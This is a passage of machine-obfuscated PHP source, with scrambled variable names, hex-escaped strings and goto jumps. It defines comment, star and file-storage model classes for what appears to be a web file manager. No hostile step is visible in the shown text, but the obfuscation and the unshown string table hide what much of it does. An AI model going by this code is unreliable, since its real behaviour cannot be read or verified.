$×úµÕÚß * (1 - $¸“ÙÁ¦¶[$î§˜”©›[1676]]) / $¸“ÙÁ¦¶[$î§˜”©›[1676]]; } } public function copyFileStart($‡é×•ÑŠ, $çèóÇê¿, $µçÂ€¢ƒ, $¦ºàÑó, $àßşğ, $ĞéœÛ¥Ş) { $Íçàˆª =& $_SERVER[óó‹¸‚å]; parent::copyFileStart($‡é×•ÑŠ, $çèóÇê¿, $µçÂ€¢ƒ, $¦ºàÑó, $àßşğ, $ĞéœÛ¥Ş); $Ñ”äï =& $this->task; if ($Ñ”äï[$Íçàˆª[1787]] == $Íçàˆª[313]) { $Ñ”äï[$Íçàˆª[1787]] = $Íçàˆª[107]; } $this->update(); } public function copyFileEnd($çÉëüİ, $˜‹Ô«à‘, $Ş¦Œ¥ıà, $ğ•Ğ›‡Ñ, $§¦‚¤, $ŠºÁ¹®») { $¾ÙÁ©î¥ =& $_SERVER[óó‹¸‚å]; $òˆœ…ßå =& $this->task; $òˆœ…ßå[$¾ÙÁ©î¥[1728]] = $òˆœ…ßå[$¾ÙÁ©î¥[1727]]; $òˆœ…ßå[$¾ÙÁ©î¥[1732]] += $òˆœ…ßå[$¾ÙÁ©î¥[1727]]; $òˆœ…ßå[$¾ÙÁ©î¥[1729]] = $¾ÙÁ©î¥[12]; $this->update(); } public function nameParse($Ú®®Èü´) { $Ÿü’ñòÓ =& $_SERVER[óó‹¸‚å]; $Óº’èƒù =& $this->task; if ($Óº’èƒù[$Ÿü’ñòÓ[1675]] < $Óº’èƒù[$Ÿü’ñòÓ[790]]) { $«ÌÕÒ·ù = get_path_this($Ú®®Èü´); if (strstr($«ÌÕÒ·ù, $Ÿü’ñòÓ[10])) { $Óº’èƒù[$Ÿü’ñòÓ[1675]] += 1; } } if ($Óº’èƒù[$Ÿü’ñòÓ[1787]] == $Ÿü’ñòÓ[1202]) { $Óº’èƒù[$Ÿü’ñòÓ[1787]] = $Ÿü’ñòÓ[313]; } $Óº’èƒù[$Ÿü’ñòÓ[1725]] = $Ú®®Èü´; $this->update(); } } goto f¥ÌŞ¢ÆŞŒ; CÜ¨¬¾Ô†“: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\x6d\x65\x6e\164"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\141\155\x65" => "\143\x6f\x6d\155\145\156\x74\x5f\x6d\x65\164\x61", "\155\145\164\141\x46\151\145\x6c\x64" => "\x63\x6f\x6d\x6d\x65\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ê°ƒó•½) { $ÉëŠ‹Ñ† =& $_SERVER[óó‹¸‚å]; if ($ê°ƒó•½[$ÉëŠ‹Ñ†[1892]]) { $İŒ™è¦¥ = $this->where(array($ÉëŠ‹Ñ†[1893] => $ê°ƒó•½[$ÉëŠ‹Ñ†[1892]]))->find(); if (!$İŒ™è¦¥ || $İŒ™è¦¥[$ÉëŠ‹Ñ†[411]] != $ê°ƒó•½[$ÉëŠ‹Ñ†[411]] || $İŒ™è¦¥[$ÉëŠ‹Ñ†[505]] != $ê°ƒó•½[$ÉëŠ‹Ñ†[505]]) { return !1; } $this->where(array($ÉëŠ‹Ñ†[1893] => $ê°ƒó•½[$ÉëŠ‹Ñ†[1892]]))->setAdd($ÉëŠ‹Ñ†[1894], 1); } $ê°ƒó•½[$ÉëŠ‹Ñ†[1895]] = 0; $ê°ƒó•½[$ÉëŠ‹Ñ†[1894]] = 0; $ê°ƒó•½[$ÉëŠ‹Ñ†[754]] = 1; return $this->add($ê°ƒó•½); } public function commentCount($€äÃåÜÆ, $ÏøŞúÚ, $©«©ºŒ = false) { $¼¾¹¾õÏ =& $_SERVER[óó‹¸‚å]; if (!$€äÃåÜÆ) { return array(); } if (is_string($€äÃåÜÆ) || is_int($€äÃåÜÆ)) { $€äÃåÜÆ = array($€äÃåÜÆ); } $Ö™úß›ô = array($¼¾¹¾õÏ[505], $¼¾¹¾õÏ[1896] => $¼¾¹¾õÏ[500]); $Ü‘£êäÆ = array($¼¾¹¾õÏ[505] => array($¼¾¹¾õÏ[7], $€äÃåÜÆ), $¼¾¹¾õÏ[411] => $ÏøŞúÚ); if ($©«©ºŒ) { $Ü‘£êäÆ[$¼¾¹¾õÏ[1674]] = $©«©ºŒ; } $¤ò€ÀØÃ = $this->field($Ö™úß›ô)->where($Ü‘£êäÆ)->group($¼¾¹¾õÏ[505])->select(); return array_to_keyvalue($¤ò€ÀØÃ, $¼¾¹¾õÏ[505], $¼¾¹¾õÏ[500]); } public function starTarget($Ó½ÅøáÔ, $ª”Èªæ®) { $ğ©İò§ı =& $_SERVER[óó‹¸‚å]; $ç˜Ñ¨õì = $Ó½ÅøáÔ + self::TYPE_STAR_OFFSET; $Â·ñ¶ = array($ğ©İò§ı[1674] => USER_ID, $ğ©İò§ı[411] => $ç˜Ñ¨õì, $ğ©İò§ı[505] => $ª”Èªæ®); $©¸ËÀ„æ = $this->where($Â·ñ¶)->find(); if ($©¸ËÀ„æ) { return $this->where(array($ğ©İò§ı[399] => $©¸ËÀ„æ[$ğ©İò§ı[399]]))->delete(); } $Ü¨‘ñ Ø = array($ğ©İò§ı[1892] => 0, $ğ©İò§ı[1674] => USER_ID, $ğ©İò§ı[754] => 1, $ğ©İò§ı[759] => $ğ©İò§ı[12], $ğ©İò§ı[411] => $ç˜Ñ¨õì, $ğ©İò§ı[505] => $ª”Èªæ®, $ğ©İò§ı[1895] => 0, $ğ©İò§ı[1894] => 0); return $this->add($Ü¨‘ñ Ø); } public function starTargetCount($Êó¹Š¯¤, $ü¨ÜøË) { $ÜœÏæ‚ø =& $_SERVER[óó‹¸‚å]; $èÓØµóË = $ü¨ÜøË + self::TYPE_STAR_OFFSET; $¦¼ŞœÜ = $this->commentCount($Êó¹Š¯¤, $èÓØµóË); $«Æ»÷æú = $this->commentCount($Êó¹Š¯¤, $èÓØµóË, USER_ID); return array($ÜœÏæ‚ø[1897] => $¦¼ŞœÜ, $ÜœÏæ‚ø[1898] => $«Æ»÷æú); } public function starTargetUserList($¼Ö‚óí, $á—¬ŒÕÍ) { $®öĞÕ‚– =& $_SERVER[óó‹¸‚å]; $Ù €ĞéÆ = $¼Ö‚óí + self::TYPE_STAR_OFFSET; $‰¾æñà = array($®öĞÕ‚–[505] => $á—¬ŒÕÍ, $®öĞÕ‚–[411] => $Ù €ĞéÆ); $¡àÒÖÎ” = $this->where($‰¾æñà)->count(); $ªı„±Œ = array($®öĞÕ‚–[255] => $¡àÒÖÎ”, $®öĞÕ‚–[1899] => array()); if (!$¡àÒÖÎ”) { return $ªı„±Œ; } $àÏÌºÏ­ = $this->field($®öĞÕ‚–[1674])->where($‰¾æñà)->limit(500)->select(); $àÏÌºÏ­ = array_to_keyvalue($àÏÌºÏ­, $®öĞÕ‚–[12], $®öĞÕ‚–[1674]); $ªı„±Œ[$®öĞÕ‚–[1899]] = Model($®öĞÕ‚–[513])->userListInfo($àÏÌºÏ­); return $ªı„±Œ; } public function prasiseUserList($ú¯¢µÎ) { $ñÇ‡Æ¥Ì =& $_SERVER[óó‹¸‚å]; $·Ë÷Åƒ× = array($ñÇ‡Æ¥Ì[1900] => $ú¯¢µÎ); $Ô¥±ĞÚ… = $this->where($·Ë÷Åƒ×)->find(); $œÔ»´¶£ = _get($Ô¥±ĞÚ…, $ñÇ‡Æ¥Ì[1895], 0); $Œşô®Õ› = array($ñÇ‡Æ¥Ì[255] => $œÔ»´¶£, $ñÇ‡Æ¥Ì[1899] => array()); if (!$œÔ»´¶£) { return $Œşô®Õ›; } $Â«”‚èË = Model($ñÇ‡Æ¥Ì[1901])->field($ñÇ‡Æ¥Ì[1674])->where($·Ë÷Åƒ×)->limit(500)->select(); $Â«”‚èË = array_to_keyvalue($Â«”‚èË, $ñÇ‡Æ¥Ì[12], $ñÇ‡Æ¥Ì[1674]); $Œşô®Õ›[$ñÇ‡Æ¥Ì[1899]] = Model($ñÇ‡Æ¥Ì[513])->userListInfo($Â«”‚èË); return $Œşô®Õ›; } public function remove($Ã¶›ÉÑç) { $í——éãÁ =& $_SERVER[óó‹¸‚å]; $‘şµá = array($í——éãÁ[1893] => $Ã¶›ÉÑç); $áıĞó†è = $this->where($‘şµá)->find(); if ($áıĞó†è[$í——éãÁ[1892]]) { $this->where(array($í——éãÁ[1893] => $áıĞó†è[$í——éãÁ[1892]]))->setAdd($í——éãÁ[1894], -1); } return $this->where($‘şµá)->delete(); } public function edit($¦ü–ç²ƒ, $˜ã‡ìÖİ) { $ˆÀ×øâÛ =& $_SERVER[óó‹¸‚å]; $êëôÈ¥« = array($ˆÀ×øâÛ[1893] => $¦ü–ç²ƒ); return $this->where($êëôÈ¥«)->save(array($ˆÀ×øâÛ[1902] => $˜ã‡ìÖİ)); } public function prasise($¼ì˜±º) { $à•çÃÂ =& $_SERVER[óó‹¸‚å]; $®ú¹¢“ş = Model($à•çÃÂ[1903]); $ÖƒÈˆèì = array($à•çÃÂ[1893] => $¼ì˜±º, $à•çÃÂ[1665] => USER_ID); $ó¯’²ÙÍ = $®ú¹¢“ş->where($ÖƒÈˆèì)->find(); if (!$ó¯’²ÙÍ) { $®ú¹¢“ş->add($ÖƒÈˆèì); $ûÑĞ¼¹¬ = $this->where(array($à•çÃÂ[1893] => $¼ì˜±º))->setAdd($à•çÃÂ[1895], 1); } else { $®ú¹¢“ş->where($ÖƒÈˆèì)->delete(); $ûÑĞ¼¹¬ = $this->where(array($à•çÃÂ[1893] => $¼ì˜±º))->setAdd($à•çÃÂ[1895], -1); } return $ûÑĞ¼¹¬; } public function targetInfo($¶Îø¸¬, $„ëşø´ú) { $ŒÑ½–ĞÒ =& $_SERVER[óó‹¸‚å]; $á¢çÌïÂ = array($ŒÑ½–ĞÒ[586] => $¶Îø¸¬, $ŒÑ½–ĞÒ[587] => $„ëşø´ú); $ä«¶åÔÒ = $this->where($á¢çÌïÂ)->count(); $ã›ö¬˜ = "\122\111\107\x48\124\40\x4a\117\x49\116\40{$this->tablePrefix}\x63\157\x6d\155\145\156\x74\137\160\162\141\151\163\x65\x20\163\x74\141\162\40\x6f\156\40\143\157\155\x6d\145\x6e\164\56\x63\x6f\x6d\x6d\145\156\164\x49\104\x20\x3d\x20\x73\x74\x61\162\56\x63\157\155\x6d\x65\x6e\164\111\x44"; $ö‘¬‹µç = $this->alias($ŒÑ½–ĞÒ[354])->where($á¢çÌïÂ)->join($ã›ö¬˜, $ŒÑ½–ĞÒ[1904])->count(); $ÍºüÏÑ = array($ŒÑ½–ĞÒ[1905] => $ä«¶åÔÒ, $ŒÑ½–ĞÒ[1906] => $ö‘¬‹µç); return $ÍºüÏÑ; } public function listData($€¤’ì°à) { $¿¼Ò¯ºÆ =& $_SERVER[óó‹¸‚å]; if (isset($€¤’ì°à[$¿¼Ò¯ºÆ[1907]])) { if ($€¤’ì°à[$¿¼Ò¯ºÆ[1907]]) { $€¤’ì°à[$¿¼Ò¯ºÆ[1900]] = array($¿¼Ò¯ºÆ[1021], intval($€¤’ì°à[$¿¼Ò¯ºÆ[1907]])); } unset($€¤’ì°à[$¿¼Ò¯ºÆ[1907]]); } if (isset($€¤’ì°à[$¿¼Ò¯ºÆ[1908]])) { if ($€¤’ì°à[$¿¼Ò¯ºÆ[1908]]) { $€¤’ì°à[$¿¼Ò¯ºÆ[1900]] = array($¿¼Ò¯ºÆ[1018], intval($€¤’ì°à[$¿¼Ò¯ºÆ[1908]])); } unset($€¤’ì°à[$¿¼Ò¯ºÆ[1908]]); } return $this->_listData($€¤’ì°à); } private function _listData($Óéşúù ) { $¹¼ØË£˜ =& $_SERVER[óó‹¸‚å]; $¾ßº²ÒĞ = $this->where($Óéşúù )->_makeOrder()->selectPage(100); $this->_listAppendParent($¾ßº²ÒĞ[$¹¼ØË£˜[369]]); $this->_listAppendUser($¾ßº²ÒĞ[$¹¼ØË£˜[369]]); $this->_listAppendMeta($¾ßº²ÒĞ[$¹¼ØË£˜[369]]); return $¾ßº²ÒĞ; } private function _makeOrder() { $’å—åçÇ =& $_SERVER[óó‹¸‚å]; $®„ù«ú = array($’å—åçÇ[1895], $’å—åçÇ[1894], $’å—åçÇ[200]); $½•«ŒË² = Input::get($’å—åçÇ[457], $’å—åçÇ[7], $’å—åçÇ[423], $®„ù«ú); $’–Ğóï = Input::get($’å—åçÇ[458], $’å—åçÇ[7], $’å—åçÇ[1667], array($’å—åçÇ[1909], $’å—åçÇ[453])); $¢‰±¡ = $½•«ŒË² . $’å—åçÇ[53] . $’–Ğóï; return $this->order($¢‰±¡); } private function _listAppendParent(&$Û¦Ï«øÎ) { $µ©‹”ıä =& $_SERVER[óó‹¸‚å]; $¦“…ÎÒí = array_unique(array_to_keyvalue($Û¦Ï«øÎ, $µ©‹”ıä[12], $µ©‹”ıä[1892])); $¦“…ÎÒí = array_remove_value($¦“…ÎÒí, $µ©‹”ıä[197]); if (!$¦“…ÎÒí) { return; } $­ÍÃÅÆ´ = $this->where(array($µ©‹”ıä[1893] => array($µ©‹”ıä[7], $¦“…ÎÒí)))->select(); $­ÍÃÅÆ´ = array_to_keyvalue($­ÍÃÅÆ´, $µ©‹”ıä[1900]); foreach ($Û¦Ï«øÎ as &$€Ê—˜ÛĞ) { if (isset($­ÍÃÅÆ´[$€Ê—˜ÛĞ[$µ©‹”ıä[1892]]])) { $€Ê—˜ÛĞ[$µ©‹”ıä[1910]] = $­ÍÃÅÆ´[$€Ê—˜ÛĞ[$µ©‹”ıä[1892]]]; } } unset($€Ê—˜ÛĞ); } private function _listAppendUser(&$ÇÊÁ’ü) { $¡‰µ¬Ë® =& $_SERVER[óó‹¸‚å]; $Ï³¦°›æ = array_unique(array_to_keyvalue($ÇÊÁ’ü, $¡‰µ¬Ë®[12], $¡‰µ¬Ë®[1674])); $Ï³¦°›æ = array_remove_value($Ï³¦°›æ, $¡‰µ¬Ë®[197]); if (count($Ï³¦°›æ) == 0) { return; } foreach ($ÇÊÁ’ü as $ç¥æ‘‚) { if (isset($ç¥æ‘‚[$¡‰µ¬Ë®[1910]])) { $Ï³¦°›æ[] = $ç¥æ‘‚[$¡‰µ¬Ë®[1910]][$¡‰µ¬Ë®[1674]]; } } $ÎÔ…êè = Model($¡‰µ¬Ë®[535])->userListInfo($Ï³¦°›æ); foreach ($ÇÊÁ’ü as &$ç¥æ‘‚) { $ç¥æ‘‚[$¡‰µ¬Ë®[600]] = $ÎÔ…êè[$ç¥æ‘‚[$¡‰µ¬Ë®[1674]]]; if (isset($ç¥æ‘‚[$¡‰µ¬Ë®[1910]])) { $ç¥æ‘‚[$¡‰µ¬Ë®[1910]][$¡‰µ¬Ë®[600]] = $ÎÔ…êè[$ç¥æ‘‚[$¡‰µ¬Ë®[1910]][$¡‰µ¬Ë®[1674]]]; } } unset($ç¥æ‘‚); } private function _listAppendMeta(&$Ãî¢Üˆß) { $ºãÚ“çì =& $_SERVER[óó‹¸‚å]; $´¶÷Ã²Î = array_unique(array_to_keyvalue($Ãî¢Üˆß, $ºãÚ“çì[12], $ºãÚ“çì[1900])); $´¶÷Ã²Î = array_remove_value($´¶÷Ã²Î, $ºãÚ“çì[197]); if (!$´¶÷Ã²Î) { return; } foreach ($Ãî¢Üˆß as $”¬ôÄÏ) { if (isset($”¬ôÄÏ[$ºãÚ“çì[1910]])) { $´¶÷Ã²Î[] = $”¬ôÄÏ[$ºãÚ“çì[1910]][$ºãÚ“çì[1900]]; } } $±¡Ä“˜¦ = $this->metaList($´¶÷Ã²Î); if (!$±¡Ä“˜¦) { return !1; } foreach ($Ãî¢Üˆß as &$”¬ôÄÏ) { $”¬ôÄÏ[$ºãÚ“çì[466]] = $±¡Ä“˜¦[$”¬ôÄÏ[$ºãÚ“çì[1900]]]; if (isset($”¬ôÄÏ[$ºãÚ“çì[1910]])) { $”¬ôÄÏ[$ºãÚ“çì[1910]][$ºãÚ“çì[466]] = $±¡Ä“˜¦[$”¬ôÄÏ[$ºãÚ“çì[1910]][$ºãÚ“çì[1900]]]; } } unset($”¬ôÄÏ); } private function metaList($·Ÿ´Çü») { $–™¸š— =& $_SERVER[óó‹¸‚å]; if (!$·Ÿ´Çü») { return array(); } $µ¿ÂÑË = array($–™¸š—[1900] => array($–™¸š—[7], $·Ÿ´Çü»)); $ò…àñù = Model($–™¸š—[1911])->where($µ¿ÂÑË)->select(); $ò…àñù = array_to_keyvalue_group($ò…àñù, $–™¸š—[1900]); foreach ($ò…àñù as $Óáí£© => $Ãí£ÌË) { $¢³Ñ®£ = array(); foreach ($Ãí£ÌË as $¯Åìõá†) { $¢³Ñ®£[$¯Åìõá†[$–™¸š—[94]]] = $¯Åìõá†[$–™¸š—[374]]; } $ò…àñù[$Óáí£©] = $¢³Ñ®£; } return $ò…àñù ? $ò…àñù : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\146\151\x6c\x65\137\143\157\x6e\164\145\x6e\164\x73"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\x54\x69\x6d\145", "\164\151\x6d\x65", "\x69\x6e\163\x65\162\x74", "\x66\165\x6e\x63\x74\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\x69\x6c\x65"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\141\x6d\145" => "\x69\x6f\x5f\146\151\x6c\145\x5f\155\x65\x74\x61", "\x6d\x65\164\x61\x46\151\145\x6c\144" => "\x66\151\154\145\111\104"); public function fileInfo($ÖÉ˜Éå) { $ôÈåÃéÜ =& $_SERVER[óó‹¸‚å]; static $ˆÀì†Ù = array(); if (!isset($ˆÀì†Ù[$ÖÉ˜Éå])) { $Œ€†ƒô” = $ôÈåÃéÜ[1912]; $âì¹¶ = Model($ôÈåÃéÜ[471])->field($Œ€†ƒô”)->where(array($ôÈåÃéÜ[469] => $ÖÉ˜Éå))->find(); $ˆÀì†Ù[$ÖÉ˜Éå] = $âì¹¶; } return $ˆÀì†Ù[$ÖÉ˜Éå]; } public function addFileByContent($Ï±œÆÙ = '', $ŒÌûÎç¯ = '') { $íÏ­Ğ®È =& $_SERVER[óó‹¸‚å]; $Œêğ¢°è = TEMP_PATH . $íÏ­Ğ®È[1913]; if (!is_dir($Œêğ¢°è)) { mk_dir($Œêğ¢°è); } $ƒê ¼ = $Œêğ¢°è . $íÏ­Ğ®È[1914] . rand_string(16); file_put_contents($ƒê ¼, $Ï±œÆÙ); $Ï§Ò—¿Ó = $this->addFile($ƒê ¼, $ŒÌûÎç¯, !0); if (file_exists($ƒê ¼)) { @unlink($ƒê ¼); } return $Ï§Ò—¿Ó; } public function createFileName($¯«¤¥Â, $ˆª´°ğé = false, $å„ÎòÃ” = false) { $¢æËñÏ =& $_SERVER[óó‹¸‚å]; $¸Œëğˆ = IO::init($¢æËñÏ[8]); $ïñ¯¡Éˆ = $this->makeFilePath($¯«¤¥Â, $¸Œëğˆ, $ˆª´°ğé, $å„ÎòÃ”); $ÒŠ¬Û¤ã = $¸Œëğˆ->pathFather($ïñ¯¡Éˆ); static $Ä¡ğÜŠ = false; $‡·ÈÒ¶Ö = $¢æËñÏ[1915] . md5($ÒŠ¬Û¤ã); if (!$Ä¡ğÜŠ && !Cache::get($‡·ÈÒ¶Ö)) { $Ä¡ğÜŠ = !0; $··¹Üù­ = IO::mkdir($ÒŠ¬Û¤ã); if (!IO::exist($··¹Üù­ . $¢æËñÏ[801])) { IO::mkfile($··¹Üù­ . $¢æËñÏ[801]); } Cache::set($‡·ÈÒ¶Ö, 1, 3600 * 2); } return $ïñ¯¡Éˆ; } public function makeFilePath($ÔÛÂû®”, $ÏûÛ¸Ó«, $ÒíÇ…‘ = false, $ÇÁ¼¡³ = false) { $Ÿ­–èŸš =& $_SERVER[óó‹¸‚å]; $´´á¿¢ñ = Model($Ÿ­–èŸš[774])->get($Ÿ­–èŸš[1916]); $”äÀ¨ë = KodIO::defaultIO() . date($Ÿ­–èŸš[1917]); $æ‚—æ¨ = $”äÀ¨ë . rand_string(5) . short_id(100); $ÔÛÂû®” = str_replace($Ÿ­–èŸš[8], $Ÿ­–èŸš[11], KodIO::clear($ÔÛÂû®”)); $¶õƒùí¬ = $ÏûÛ¸Ó«->ext($ÔÛÂû®”); if (!$ÔÛÂû®”) { $´´á¿¢ñ = $Ÿ­–èŸš[1918]; } switch ($´´á¿¢ñ) { case $Ÿ­–èŸš[1919]: $æ‚—æ¨ = $æ‚—æ¨ . $Ÿ­–èŸš[10] . $ÏûÛ¸Ó«->ext($ÔÛÂû®”); if ($¶õƒùí¬ == $Ÿ­–èŸš[1856]) { $æ‚—æ¨ .= $Ÿ­–èŸš[1214]; } break; case $Ÿ­–èŸš[1920]: $øò‡©ˆÜ = Model($Ÿ­–èŸš[774])->get($Ÿ­–èŸš[775]); $¾àÖ›Û = substr(md5($Ÿ­–èŸš[776] . $øò‡©ˆÜ . date($Ÿ­–èŸš[752])), 0, 8); $ºº†òßÑ = KodIO::defaultDriver(); $”äÀ¨ë = $Ÿ­–èŸš[1245] . $ºº†òßÑ[$Ÿ­–èŸš[399]] . $Ÿ­–èŸš[409] . date($Ÿ­–èŸš[1921]) . $¾àÖ›Û . $Ÿ­–èŸš[8]; if ($¶õƒùí¬ == $Ÿ­–èŸš[1856]) { $ÔÛÂû®” .= $Ÿ­–èŸš[1214]; } $ñÙ¶—©£ = $Ÿ­–èŸš[1922] . $”äÀ¨ë . $ÔÛÂû®”; CacheLock::lock($ñÙ¶—©£); $æ‚—æ¨ = $”äÀ¨ë . $ÔÛÂû®”; if (IO::exist($”äÀ¨ë . $ÔÛÂû®”)) { $‰Ò¼Éëˆ = substr($ÔÛÂû®”, 0, strlen($ÔÛÂû®”) - strlen($¶õƒùí¬)); $¨‚¢»£× = $ÇÁ¼¡³ ? substr($ÇÁ¼¡³, 0, 5) : ($ÒíÇ…‘ ? substr($ÒíÇ…‘, 0, 5) : rand_string(5)); $æ‚—æ¨ = $”äÀ¨ë . $‰Ò¼Éëˆ . $¨‚¢»£× . $Ÿ­–èŸš[10] . $¶õƒùí¬; } if (IO::isTypeObject($æ‚—æ¨) && !IO::isUploadServer($æ‚—æ¨)) { if (IO::exist($æ‚—æ¨)) { return $æ‚—æ¨; } $ù„úè‘ã = IO::setContent($æ‚—æ¨, $Ÿ­–èŸš[12]); if (!$ù„úè‘ã) { show_json($Ÿ­–èŸš[1923], !1); } } CacheLock::unlock($ñÙ¶—©£); break; case $Ÿ­–èŸš[1918]: break; default: break; } return $æ‚—æ¨; } public function addFileByRemote($ª‰§øü, $ÑĞß§‹ , $ğ¦²ÀÓ’ = array()) { $¼·¯ÇËü =& $_SERVER[óó‹¸‚å]; if (!IO::exist($ª‰§øü)) { return !1; } $›Ñµ‰¶ = $ğ¦²ÀÓ’[$¼·¯ÇËü[176]] ? $ğ¦²ÀÓ’[$¼·¯ÇËü[176]] : $¼·¯ÇËü[12]; $éÕÚ²’ = IO::hashMd5($ª‰§øü, $›Ñµ‰¶); $š¢œ´çÁ = KodIO::defaultDriver(); $ÀçĞØ„Â = array($¼·¯ÇËü[585] => IO::size($ª‰§øü), $¼·¯ÇËü[1924] => 1, $¼·¯ÇËü[420] => $ÑĞß§‹ , $¼·¯ÇËü[812] => $š¢œ´çÁ[$¼·¯ÇËü[399]], $¼·¯ÇËü[421] => $ª‰§øü, $¼·¯ÇËü[1925] => $ğ¦²ÀÓ’[$¼·¯ÇËü[177]] ? $ğ¦²ÀÓ’[$¼·¯ÇËü[177]] : IO::hashSimple($ª‰§øü), $¼·¯ÇËü[1926] => $éÕÚ²’ ? $éÕÚ²’ : $›Ñµ‰¶); if ($±±œŸşá = $this->addFileCheckExist($ÀçĞØ„Â[$¼·¯ÇËü[177]], $ÀçĞØ„Â[$¼·¯ÇËü[176]], $ÀçĞØ„Â[$¼·¯ÇËü[76]])) { return $±±œŸşá; } return $this->addFileData($ÀçĞØ„Â); } private function addFileData($’éâì¨) { $³ÉÉªœ£ =& $_SERVER[óó‹¸‚å]; if (!$’éâì¨) { return !1; } $’éâì¨[$³ÉÉªœ£[76]] = intval($’éâì¨[$³ÉÉªœ£[76]]); if (!$’éâì¨[$³ÉÉªœ£[76]] && strlen($’éâì¨[$³ÉÉªœ£[177]]) > 32) { $’éâì¨[$³ÉÉªœ£[76]] = intval(substr($’éâì¨[$³ÉÉªœ£[177]], 32)); } $©µ˜íéü = $this->add($’éâì¨); return $this->find($©µ˜íéü); } public function addFile($ÃñêÓ—ì, $óÍÏÂ×—, $Ò¦†§’ = false) { $£ÑšË¼¢ =& $_SERVER[óó‹¸‚å]; $Úƒ’š£Å = IO::hashSimple($ÃñêÓ—ì); $àå¬Í¥í = IO::size($ÃñêÓ—ì); $¹”—˜ = $àå¬Í¥í <= 1024 * 1024 * 10 ? IO::hashMd5($ÃñêÓ—ì) : $£ÑšË¼¢[12]; $¿ŞÛ¥˜º = $£ÑšË¼¢[1927] . $Úƒ’š£Å; CacheLock::lock($¿ŞÛ¥˜º); if ($¹”—˜ && $Úƒ’š£Å) { $©ã…”è = $this->addFileCheckExist($Úƒ’š£Å, $¹”—˜, $àå¬Í¥í); if ($©ã…”è) { CacheLock::unlock($¿ŞÛ¥˜º); return $©ã…”è; } } $¹ÔÎ¢ªú = $this->addFileMake($ÃñêÓ—ì, $àå¬Í¥í, $Úƒ’š£Å, $¹”—˜, $óÍÏÂ×—, $Ò¦†§’); $°íŞ„¤Ñ = $this->addFileData($¹ÔÎ¢ªú); CacheLock::unlock($¿ŞÛ¥˜º); if (!$¹”—˜ && $°íŞ„¤Ñ) { $this->fileMd5Check($°íŞ„¤Ñ); } return $°íŞ„¤Ñ; } private function fileMd5Check($§œÉšÕ) { $Ïáó”Ñï =& $_SERVER[óó‹¸‚å]; $°Ô½·Ö = array($§œÉšÕ[$Ïáó”Ñï[468]], $§œÉšÕ[$Ïáó”Ñï[84]]); $¡äÂ—¥Ü = $Ïáó”Ñï[1928] . $§œÉšÕ[$Ïáó”Ñï[84]]; $úİ¥×Ï = $Ïáó”Ñï[1929] . $§œÉšÕ[$Ïáó”Ñï[468]]; $’úŒ®‹ = TaskQueue::add($Ïáó”Ñï[1930], $°Ô½·Ö, $¡äÂ—¥Ü, $úİ¥×Ï); if (!$’úŒ®‹) { $this->fileMd5Set($§œÉšÕ[$Ïáó”Ñï[468]], $§œÉšÕ[$Ïáó”Ñï[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($Ñö±şõé, $Ïş¥ÕÛÈ) { $»£íÂ– =& $_SERVER[óó‹¸‚å]; $Ìıùóğ = $this->find($Ñö±şõé); if (!$Ìıùóğ || $Ìıùóğ[$»£íÂ–[176]]) { return; } $”“«ëÛˆ = IO::hashMd5($Ïş¥ÕÛÈ); if (!$”“«ëÛˆ) { return $»£íÂ–[12]; } $this->where(array($»£íÂ–[468] => $Ñö±şõé))->save(array($»£íÂ–[176] => $”“«ëÛˆ)); } public function addFileMake($†¹ñ–Óë, $¸íÛİ¦, $èË¼ö¯, $ïãúÃ¶, $Êİà¶ÌÎ, $¯üäÜÀš) { $šÏŸ‡Âã =& $_SERVER[óó‹¸‚å]; $¥˜ÜØ¡¹ = $this->createFileName($Êİà¶ÌÎ, $èË¼ö¯, $ïãúÃ¶); $­šÀÏÈ = get_path_father($¥˜ÜØ¡¹); $£¶ÂûìÄ = get_path_this($¥˜ÜØ¡¹); if ($¯üäÜÀš) { $Ş—ÆÍóÚ = IO::move($†¹ñ–Óë, $­šÀÏÈ, !1, $£¶ÂûìÄ); } else { $Ş—ÆÍóÚ = IO::copy($†¹ñ–Óë, $­šÀÏÈ, !1, $£¶ÂûìÄ); } if (!$Ş—ÆÍóÚ) { return !1; } $ò°ÍßÖ = KodIO::defaultDriver(); $ƒÚÉ Éù = array($šÏŸ‡Âã[585] => $¸íÛİ¦, $šÏŸ‡Âã[1924] => 1, $šÏŸ‡Âã[420] => $Êİà¶ÌÎ, $šÏŸ‡Âã[812] => $ò°ÍßÖ[$šÏŸ‡Âã[399]], $šÏŸ‡Âã[421] => $¥˜ÜØ¡¹, $šÏŸ‡Âã[1925] => $èË¼ö¯, $šÏŸ‡Âã[1926] => $ïãúÃ¶); return $ƒÚÉ Éù; } public function addFileCheckExist($ì§ŸìÑ§, $øâŸğ¶, $‘ëØå´™) { $èà×Ûèã =& $_SERVER[óó‹¸‚å]; $…€ïåÓ = $this->findByHash($ì§ŸìÑ§, $øâŸğ¶); if (!$…€ïåÓ) { return !1; } $Â¡‡°À  = array($èà×Ûèã[1924] => intval($…€ïåÓ[$èà×Ûèã[1931]]) + 1, $èà×Ûèã[585] => $‘ëØå´™); $this->where(array($èà×Ûèã[469] => $…€ïåÓ[$èà×Ûèã[468]]))->save($Â¡‡°À ); return $…€ïåÓ; } public function remove($­¸ŞÈ®¦) { $this->linkCountChange($­¸ŞÈ®¦, !1); $this->clearEmpty(); return !0; } public function linkAdd($‡ö¼Æï½) { $this->linkCountChange($‡ö¼Æï½, !0); } public function linkCountChange($·ˆ–é®‹, $õ¶¨ŸÓ») { $¡•–Š·ã =& $_SERVER[óó‹¸‚å]; if (!$·ˆ–é®‹) { return; } if (!is_array($·ˆ–é®‹)) { $·ˆ–é®‹ = array($·ˆ–é®‹); } $¯úã¼ á = array(); foreach ($·ˆ–é®‹ as $•¸Åşíô) { $´şû”° = $•¸Åşíô . $¡•–Š·ã[12]; if (!$¯úã¼ á[$´şû”°]) { $¯úã¼ á[$´şû”°] = 0; } $¯úã¼ á[$´şû”°]++; } 